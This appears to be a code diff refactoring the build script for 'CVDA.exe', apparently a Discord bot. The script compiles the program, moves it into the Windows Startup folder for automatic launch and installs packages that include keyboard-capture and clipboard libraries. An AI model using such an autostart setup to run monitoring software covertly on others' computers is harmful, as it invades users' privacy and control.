@@ -16,7 +16,7 @@ username = os.path.basename(user_profile_path)
 
 STARTUP = bool
 
-# ------------- EDIT IF YOU KNOW WHAT YOU ARE DOING ---------------
+#! ------------- EDIT IF YOU KNOW WHAT YOU ARE DOING ---------------
 
 src = os.path.abspath(".\\dist\\CVDA.exe")
 distfolder = os.path.abspath(".\\dist")
@@ -109,38 +109,65 @@ def compile():
         print(e)
         return False
 
-    if STARTUP == True:
-
-        localappdata = os.environ['LOCALAPPDATA']
-        localappdata = localappdata.replace("\\", "/")
-   
-        try:
-            print(get_user_startup_folder())
-            os.system("taskkill /f /im  CVDA.exe")
-            try:
-                os.mkdir(f"{localappdata}/CVDA")
-            except FileExistsError:
-                print("Folder already exists, ignoring.")
-            except Exception as e:
-                print(f"An error has occurred during the folder creation, {e}")
-                quit()
-            subprocess.run(f'move /Y "{src}" "{get_user_startup_folder()}"', shell=True)
-            subprocess.run(f'move /Y "config.json" "{localappdata}/CVDA"', shell=True)
-            os.startfile(f"{get_user_startup_folder()}/CVDA")
-        except:
-            print("Failed to move program to startup folder, may need to be done manually. Or dst variable may need to be edited.")
-            print("\n \n Move failed..")
+    try:
+        if not STARTUP:
+            # If not using startup, move config.json to distfolder and run from there
+            subprocess.run(f'move /Y "config.json" "{distfolder}"', shell=True)
             os.startfile(distfolder)
+            return True
 
-            
-    
-    else:
+       
+        localappdata = os.environ['LOCALAPPDATA'].replace("\\", "/")
+        startup_folder = get_user_startup_folder()
+
+        print(f"Startup folder: {startup_folder}")
+
+        #! Kill the process if it's running
+        os.system("taskkill /f /im CVDA.exe")
+
+        #* Create AppData subfolder if not exists
+        try:
+            os.mkdir(f"{localappdata}/CVDA")
+        except FileExistsError:
+            print("AppData folder already exists, continuing.")
+        except Exception as e:
+            print(f"Failed to create AppData folder: {e}")
+            return False
+
+        #* Move executable to startup folder
+        res = subprocess.run(f'move /Y "{src}" "{startup_folder}"', shell=True)
+        if res.returncode != 0:
+            raise RuntimeError("Failed to move CVDA.exe to Startup folder.")
+
+        print("CVDA.exe moved to startup successfully.")
+
+        #! Move config.json to AppData
+        res = subprocess.run(f'move /Y "config.json" "{localappdata}/CVDA"', shell=True)
+        if res.returncode != 0:
+            raise ValueError("Failed to move config.json to local AppData folder.")
+
+        print("config.json moved to local AppData successfully.")
+
+
+        os.startfile(f"{startup_folder}/CVDA.exe")
+        return True
+
+    except RuntimeError as re:
+        print(re)
+        print("You may need to move the file manually.")
         subprocess.run(f'move /Y "config.json" "{distfolder}"', shell=True)
         os.startfile(distfolder)
+        return False
 
+    except ValueError as ve:
+        print(ve)
+        print("Please manually create the CVDA folder in local AppData and place config.json there.")
+        os.startfile(localappdata)
+        return False
 
-    return True
-
+    except Exception as e:
+        print(f"Unexpected error: {e}")
+        return False
 
 def findPackagesInstalled():
     packages_to_install = ["pyinstaller", "nextcord", "pyperclip", "pynput", "pillow", "pywin32", "requests"]
@@ -189,8 +216,7 @@ def findPackagesInstalled():
     if sys.version_info < (3,10):
         print("Python version below 3.10, installing aiohttp==3.9.5")
         os.system("pip install aiohttp==3.9.5")
-    else:
-        pass
+
  
  
     if not packages_to_install:
@@ -199,10 +225,8 @@ def findPackagesInstalled():
     else:
         print(f"Dependencies missing, installing {packages_to_install}")
         result = tryInstallPackages(packages=packages_to_install)
-        if result == True:
-            return True
-        else:
-            return False
+        if result == True: return True
+        else: return False
 
     
 
@@ -214,11 +238,6 @@ if packageReuslt == False:
 
 compileResult = compile()
 if compileResult == True:
-    if STARTUP == True:
-        print(" \n \n \n Completed Compiler... Check if the discord bot is online by running a command.")
+    if STARTUP == True: print(" \n \n \n Completed Compiler... Check if the discord bot is online by running a command.")
     else:
         print("\n \n \n  Completed Compiler... Run the .exe and check if the discord bot is online.")
-    input("Press Enter to Close.")
-
-else:
-    pass
